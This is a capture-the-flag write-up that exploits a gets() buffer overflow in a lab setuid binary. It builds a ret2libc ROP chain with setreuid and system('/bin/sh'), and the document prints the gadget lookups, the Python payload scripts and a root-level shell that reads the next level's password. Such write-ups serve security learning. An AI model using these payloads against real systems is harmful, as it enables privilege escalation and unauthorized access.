## Infos on the binary

```shell
level03@rainfall:~$ checksec armitage
[*] '/home/level03/armitage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled # No executable stack
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

In `queue_job`, there is a gets() into a 128 bytes buffer, with no protection. We can overflow if 


```shell
level03@rainfall:~$ ldd ./armitage
	linux-vdso.so.1 (0x00007ffff7fc3000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c00000) # This one
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fc5000)
```

```shell
level03@rainfall:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ": ret"
0x0000000000028a92 : ret

level03@rainfall:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
0x000000000010c08d : pop rdi ; ret

level03@rainfall:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rsi ; ret"
0x0000000000110b7d : pop rsi ; ret

level03@rainfall:~$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep "setreuid"
0000000000127370 W setreuid@@GLIBC_2.2.5


level03@rainfall:~$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep "setuid"
000000000010ebc0 W setuid@@GLIBC_2.2.5


level03@rainfall:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "/bin/sh"
Strings information
============================================================
0x00000000001cc42f : /bin/sh

level03@rainfall:~$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
0000000000058750 T __libc_system@@GLIBC_PRIVATE # this one
00000000001784d0 T svcerr_systemerr@GLIBC_2.2.5
0000000000058750 W system@@GLIBC_2.2.5
```

to check the addresses on gdb :
```shell
(gdb) start
(gdb) x/s 0x7ffff7dcc42f
0x7ffff7dcc42f:	"/bin/sh"

info symbol 0x7ffff7d27370
setreuid in section .text of /lib/x86_64-linux-gnu/libc.so.6

(gdb) info symbol 0x7ffff7c58750
system in section .text of /lib/x86_64-linux-gnu/libc.so.6

(gdb) x/2i 0x7ffff7d0c08d
   0x7ffff7d0c08d <re_compile_internal+2077>:	pop    %rdi
   0x7ffff7d0c08e <re_compile_internal+2078>:	ret
```

```shell
python3 -c '
import sys, struct
p64 = lambda x: struct.pack("<Q", x)

payload  = b"A" * 136
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(0x7ffff7dcc42f)   # "/bin/sh"
payload += p64(0x7ffff7c28a92)   # ret (alignement avant system)
payload += p64(0x7ffff7c58750)   # system
sys.stdout.buffer.write(payload)'
```

It worked like this, but we get on a shell as level03, not flag03. 
There is no `/bin/sh -p` in the libc.
But there is a `setreuid` function, which can be used to change the uid and euid of the process. So we can use it to set the uid and euid to 1020 (the uid of flag03), and then call system("/bin/sh") to get a shell as flag03.

```shell
grep flag03 /etc/passwd
flag03:X:1020:1022::/home/flag03
          |
         uid
```

With setuid, we can only change the uid, but not the euid, so it doesn't work either.

```shell
python3 -c '
import sys, struct
p64 = lambda x: struct.pack("<Q", x)

payload  = b"A" * 136
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(1020)             # uid de flag03
payload += p64(0x7ffff7d0ebc0)   # setuid
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(0x7ffff7dcc42f)   # "/bin/sh"
payload += p64(0x7ffff7c58750)   # system
sys.stdout.buffer.write(payload)' > /tmp/test

level03@rainfall:~$ (cat /tmp/test ; cat) | ./armitage
  [ARMITAGE] I have a job for you, cowboy.
  [ARMITAGE] Transmission channel open.
[ARMITAGE] Prove yourself: 
[ARMITAGE] Invalid job format. Expected JOB:<data>
whoami
level03

```


```shell
python3 -c '
import sys, struct
p64 = lambda x: struct.pack("<Q", x)

payload  = b"A" * 136
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(1020)             # uid de flag03
payload += p64(0x7ffff7d10b7d)   # pop rsi ; ret
payload += p64(1020)             # uid de flag03
payload += p64(0x7ffff7d27370)   # setreuid
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(0x7ffff7dcc42f)   # "/bin/sh"
payload += p64(0x7ffff7c58750)   # system
sys.stdout.buffer.write(payload)' > /tmp/test
```

```shell
level03@rainfall:~$ (cat /tmp/test ; cat) | ./armitage
  [ARMITAGE] I have a job for you, cowboy.
  [ARMITAGE] Transmission channel open.
[ARMITAGE] Prove yourself: 
[ARMITAGE] Invalid job format. Expected JOB:<data>
whoami
flag03
cat /home/flag03/.pass
8c33zqo7hytqnsx9h3nb4juf3rdjbd80
```